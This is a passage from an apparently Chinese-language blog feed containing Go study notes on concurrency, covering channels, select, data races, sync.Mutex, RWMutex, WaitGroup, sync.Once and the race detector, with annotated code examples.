class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>) <span class="hljs-comment">// 一个非缓冲通道</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-keyword">int</span>, x <span class="hljs-keyword">int</span>)</span></span> &#123;<br>time.Sleep(time.Second)<br><span class="hljs-comment">// &lt;-ch    // 此操作编译不通过</span><br>ch &lt;- x*x  <span class="hljs-comment">// 阻塞在此，直到发送的值被接收</span><br>&#125;(c, <span class="hljs-number">3</span>)<br>done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ch &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>n := &lt;-ch      <span class="hljs-comment">// 阻塞在此，直到有值发送到c</span><br>fmt.Println(n) <span class="hljs-comment">// 9</span><br><span class="hljs-comment">// ch &lt;- 123   // 此操作编译不通过</span><br>time.Sleep(time.Second)<br>done &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;(c)<br>&lt;-done <span class="hljs-comment">// 阻塞在此，直到有值发送到done</span><br>fmt.Println(<span class="hljs-string">&quot;bye&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//输出：</span><br><span class="hljs-comment">//9 </span><br><span class="hljs-comment">//bye</span><br></code></pre></td></tr></table></figure><p>缓冲通道的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">// 一个容量为2的缓冲通道</span><br>c &lt;- <span class="hljs-number">3</span><br>c &lt;- <span class="hljs-number">5</span><br><span class="hljs-built_in">close</span>(c)<br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 2 2</span><br>x, ok := &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 3 true</span><br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 1 2</span><br>x, ok = &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 5 true</span><br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 0 2</span><br>x, ok = &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 0 false</span><br>x, ok = &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 0 false</span><br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 0 2</span><br><span class="hljs-built_in">close</span>(c) <span class="hljs-comment">// 此行将产生一个恐慌</span><br>c &lt;- <span class="hljs-number">7</span>   <span class="hljs-comment">// 如果上一行不存在，此行也将产生一个恐慌。</span><br></code></pre></td></tr></table></figure><h3 id="select流程控制"><a href="#select流程控制" class="headerlink" title="select流程控制"></a>select流程控制</h3><p>多路复用可以简单地理解为，N 个 channel 中，任意一个 channel 有数据产生，select 都可以监听到，然后执行相应的分支，接收数据并处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">//声明三个存放结果的channel</span><br> <br>   firstCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)<br>   secondCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)<br>   threeCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)<br> <br>   <span class="hljs-comment">//同时开启3个goroutine下载</span><br> <br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      firstCh &lt;- downloadFile(<span class="hljs-string">&quot;firstCh&quot;</span>)<br>   &#125;()<br> <br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      secondCh &lt;- downloadFile(<span class="hljs-string">&quot;secondCh&quot;</span>)<br>   &#125;()<br> <br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      threeCh &lt;- downloadFile(<span class="hljs-string">&quot;threeCh&quot;</span>)<br>   &#125;()<br> <br>   <span class="hljs-comment">//开始select多路复用，哪个channel能获取到值，就说明哪个最先下载好，就用哪个。</span><br> <br>   <span class="hljs-keyword">select</span> &#123;<br> <br>   <span class="hljs-keyword">case</span> filePath := &lt;-firstCh:<br>      fmt.Println(filePath)<br> <br>   <span class="hljs-keyword">case</span> filePath := &lt;-secondCh:<br>      fmt.Println(filePath)<br> <br>   <span class="hljs-keyword">case</span> filePath := &lt;-threeCh:<br>      fmt.Println(filePath)<br>   &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">downloadFile</span><span class="hljs-params">(chanName <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> &#123;<br>   <span class="hljs-comment">//模拟下载文件,可以自己随机time.Sleep点时间试试</span><br> <br>   time.Sleep(time.Second)<br>   <span class="hljs-keyword">return</span> chanName+<span class="hljs-string">&quot;:filePath&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="共享变量的并发"><a href="#共享变量的并发" class="headerlink" title="共享变量的并发"></a>共享变量的并发</h2><p><a href="https://lailin.xyz/post/go-training-week3-sync.html">深入源码</a></p><h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">var</span> a, b <span class="hljs-keyword">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span> &#123;<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">2</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">g</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;b=&quot;</span>,b)<br>fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>,a)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> f()<br>g()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/13/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220813225331713.png" alt="image-20220813225331713"></p><p>以上代码有四种可能的输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">b=<span class="hljs-number">2</span>,a=<span class="hljs-number">1</span>  <span class="hljs-comment">//1-2-3-4</span><br>b=<span class="hljs-number">0</span>,a=<span class="hljs-number">0</span>  <span class="hljs-comment">//3-4-1-2</span><br>b=<span class="hljs-number">0</span>,a=<span class="hljs-number">1</span>  <span class="hljs-comment">//3-1-2-4</span><br>b=<span class="hljs-number">2</span>,a=<span class="hljs-number">0</span>  <span class="hljs-comment">//2-3-4-1</span><br></code></pre></td></tr></table></figure><p>无论任何时候，只要有两个goroutine并发访问同一变量，且至少其中的一个是写操作的时候就会发生数据竞争。并且，在不影响语言规范对 goroutine 的行为定义的时候，编译器和 CPU 会对读取和写入的顺序进行重新排序。</p><p>所有并发的问题都可以用一致的、简单的既定的模式来规避。所以可能的话，将变量限定在goroutine内部；如果是多个goroutine都需要访问的变量，使用互斥条件来访问。</p><h3 id="sync-Mutex互斥锁"><a href="#sync-Mutex互斥锁" class="headerlink" title="sync.Mutex互斥锁"></a>sync.Mutex互斥锁</h3><p>可以使用一个容量只有1的channel来保证最多只有一个goroutine在同一时刻访问一个共享变量。一个只能为1和0的信号量叫做二元信号量(binary semaphore)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>    sema    = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">1</span>) <span class="hljs-comment">// a binary semaphore guarding balance</span><br>    balance <span class="hljs-keyword">int</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Deposit</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span></span> &#123;<br>    sema &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125; <span class="hljs-comment">// acquire token</span><br>    balance = balance + amount<br>    &lt;-sema <span class="hljs-comment">// release token</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Balance</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123;<br>    sema &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125; <span class="hljs-comment">// acquire token</span><br>    b := balance<br>    &lt;-sema <span class="hljs-comment">// release token</span><br>    <span class="hljs-keyword">return</span> b<br>&#125;<br></code></pre></td></tr></table></figure><p>sync包里的Mutex类型可以直接支持。它的Lock方法能够获取到token(这里叫锁)，并且Unlock方法会释放这个token。</p><p>如果其它的goroutine已经获得了这个锁的话，这个操作会被阻塞直到其它goroutine调用了Unlock使该锁变回可用状态。mutex会保护共享变量。</p><p>尽量使用defer来将临界区扩展到函数的结束。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;sync&quot;</span><br><br><span class="hljs-keyword">var</span> (<br>    mu      sync.Mutex <span class="hljs-comment">// guards balance</span><br>    balance <span class="hljs-keyword">int</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Withdraw</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">bool</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    deposit(-amount)<br>    <span class="hljs-keyword">if</span> balance &lt; <span class="hljs-number">0</span> &#123;<br>        deposit(amount)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-comment">// insufficient funds</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Deposit</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    deposit(amount)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Balance</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    <span class="hljs-keyword">return</span> balance<br>&#125;<br><br><span class="hljs-comment">// This function requires that the lock be held.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">deposit</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span></span> &#123; balance += amount &#125;<br></code></pre></td></tr></table></figure><p>没法对一个已经锁上的mutex来再次上锁–这会导致程序死锁，没法继续执行下去，Withdraw会永远阻塞下去。</p><p>这样的写法是错误的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> incorrect!</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Withdraw</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">bool</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    Deposit(-amount)<br>    <span class="hljs-keyword">if</span> Balance() &lt; <span class="hljs-number">0</span> &#123;<br>        Deposit(amount)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-comment">// insufficient funds</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sync-RWMutex读写锁"><a href="#sync-RWMutex读写锁" class="headerlink" title="sync.RWMutex读写锁"></a>sync.RWMutex读写锁</h3><p>允许多个只读操作并行执行，但写操作会完全互斥</p><p>RWMutex需要更复杂的内部记录，所以会让它比一般的无竞争锁的mutex慢一些。</p><p>sync.WaitGroup</p><p>一个 WaitGroup 对象可以等待一组协程结束 简单使用就是在创建一个任务的时候<code>wg.Add(1)</code>, 任务完成的时候使用<code>wg.Done()</code>来将任务减一。使用<code>wg.Wait()</code>来阻塞等待所有任务完成。</p><p>例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br> <br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;sync&quot;</span><br>)<br> <br><span class="hljs-keyword">type</span> httpPkg <span class="hljs-keyword">struct</span>&#123;&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(httpPkg)</span> <span class="hljs-title">Get</span><span class="hljs-params">(url <span class="hljs-keyword">string</span>)</span></span> &#123;&#125;<br> <br><span class="hljs-keyword">var</span> http httpPkg<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup<br>    <span class="hljs-keyword">var</span> urls = []<span class="hljs-keyword">string</span>&#123;<br>        <span class="hljs-string">&quot;&lt;http://www.golang.org/&gt;&quot;</span>,<br>        <span class="hljs-string">&quot;&lt;http://www.google.com/&gt;&quot;</span>,<br>        <span class="hljs-string">&quot;&lt;http://www.somestupidname.com/&gt;&quot;</span>,<br>    &#125;<br>    <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> urls &#123;<br>        <span class="hljs-comment">// Increment the WaitGroup counter.</span><br>        wg.Add(<span class="hljs-number">1</span>)<br>        <span class="hljs-comment">// Launch a goroutine to fetch the URL.</span><br>        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(url <span class="hljs-keyword">string</span>)</span></span> &#123;<br>            <span class="hljs-comment">// Decrement the counter when the goroutine completes.</span><br>            <span class="hljs-keyword">defer</span> wg.Done()<br>            <span class="hljs-comment">// Fetch the URL.</span><br>            http.Get(url)<br>        &#125;(url)<br>    &#125;<br>    <span class="hljs-comment">// Wait for all HTTP fetches to complete.</span><br>    wg.Wait()<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：golang里如果方法传递的不是地址，那么就会做一个拷贝，这里调用的wg根本就不是一个对象。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup<br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>        wg.Add(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">go</span> doSomething(i, wg, ch)<br>    &#125;<br>    wg.Wait()<br>    fmt.Println(<span class="hljs-string">&quot;all done&quot;</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>        dd := &lt;-ch<br>        fmt.Println(<span class="hljs-string">&quot;from ch:&quot;</span>+strconv.Itoa(dd))<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(index <span class="hljs-keyword">int</span>, wg  sync.WaitGroup, ch <span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> wg.Done()<br>    fmt.Println(<span class="hljs-string">&quot;start done:&quot;</span> + strconv.Itoa(index))<br>    <span class="hljs-comment">//time.Sleep(20 * time.Millisecond)</span><br>    ch &lt;- index<br></code></pre></td></tr></table></figure><p>应该改为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> doSomething(i, &amp;wg, ch)<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(index <span class="hljs-keyword">int</span>, wg *sync.WaitGroup, ch <span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sync-Once初始化"><a href="#sync-Once初始化" class="headerlink" title="sync.Once初始化"></a>sync.Once初始化</h3><p><code>sync.Once</code>可以保证<code>go</code>程序在运行期间的某段代码只会执行一次，作用与<code>init</code>类似，但是也有所不同：</p><ul><li><code>init</code>函数是在文件包首次被加载的时候执行，且只执行一次。</li><li><code>sync.Once</code>是在代码运行中需要的时候执行，且只执行一次。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> (<br>o  sync.Once<br>wg sync.WaitGroup<br>)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-keyword">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br>o.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;once&quot;</span>, i)<br>&#125;)<br>&#125;(i)<br>&#125;<br><br>wg.Wait()<br>&#125;<br><br><span class="hljs-comment">//输出：once 9</span><br></code></pre></td></tr></table></figure><p>看看源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Once is an object that will perform exactly one action.</span><br><span class="hljs-keyword">type</span> Once <span class="hljs-keyword">struct</span> &#123;<br> <span class="hljs-comment">// done indicates whether the action has been performed.</span><br> <span class="hljs-comment">// It is first in the struct because it is used in the hot path.</span><br> <span class="hljs-comment">// The hot path is inlined at every call site.</span><br> <span class="hljs-comment">// Placing done first allows more compact instructions on some architectures (amd64/x86),</span><br> <span class="hljs-comment">// and fewer instructions (to calculate offset) on other architectures.</span><br> done <span class="hljs-keyword">uint32</span><br> m    Mutex<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(o *Once)</span> <span class="hljs-title">Do</span><span class="hljs-params">(f <span class="hljs-keyword">func</span>()</span>)</span> &#123;<br> <span class="hljs-keyword">if</span> atomic.LoadUint32(&amp;o.done) == <span class="hljs-number">0</span> &#123;<br>  o.doSlow(f)<br> &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(o *Once)</span> <span class="hljs-title">doSlow</span><span class="hljs-params">(f <span class="hljs-keyword">func</span>()</span>)</span> &#123;<br> o.m.Lock()<br> <span class="hljs-keyword">defer</span> o.m.Unlock()<br> <span class="hljs-keyword">if</span> o.done == <span class="hljs-number">0</span> &#123;<br>  <span class="hljs-keyword">defer</span> atomic.StoreUint32(&amp;o.done, <span class="hljs-number">1</span>)<br>  f()<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Do()中首先原子性的读取done字段的值是否改变，没有改变则执行doSlow()方法.</p><p>一进入doslow()方法就开始执行加锁操作，这样在并发情况下可以保证只有一个线程会执行，再判断一次当前done字段是否发生改变(为什么这里还要在判断一次flag？这里目的其实就是保证并发的情况下，代码块也只会执行一次，毕竟加锁是在doslow()方法内，不加这个判断的在并发情况下就会出现其他goroutine也能执行f())，如果未发生改变，则开始执行代码块，代码块运行结束后会对done字段做原子操作，标识该代码块已经被执行过了.</p><h3 id="竞争条件检测"><a href="#竞争条件检测" class="headerlink" title="竞争条件检测"></a>竞争条件检测</h3><p>Go的runtime和工具链为我们装备了一个复杂但好用的动态分析工具，竞争检查器(the race detector)。</p><p>只要在go build，go run或者go test命令后面加上-race的flag，就会使编译器创建一个你的应用的“修改”版或者一个附带了能够记录所有运行期对共享变量访问工具的test，并且会记录下每一个读或者写共享变量的goroutine的身份信息。</p><p>由于需要额外的记录，因此构建时加了竞争检测的程序跑起来会慢一些，且需要更大的内存</p><p><a href="https://juejin.cn/post/6844903918233714695">race使用指南</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>GO</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>合约变量存储机制</title>
    <link href="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/"/>
    <url>/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/</url>
    
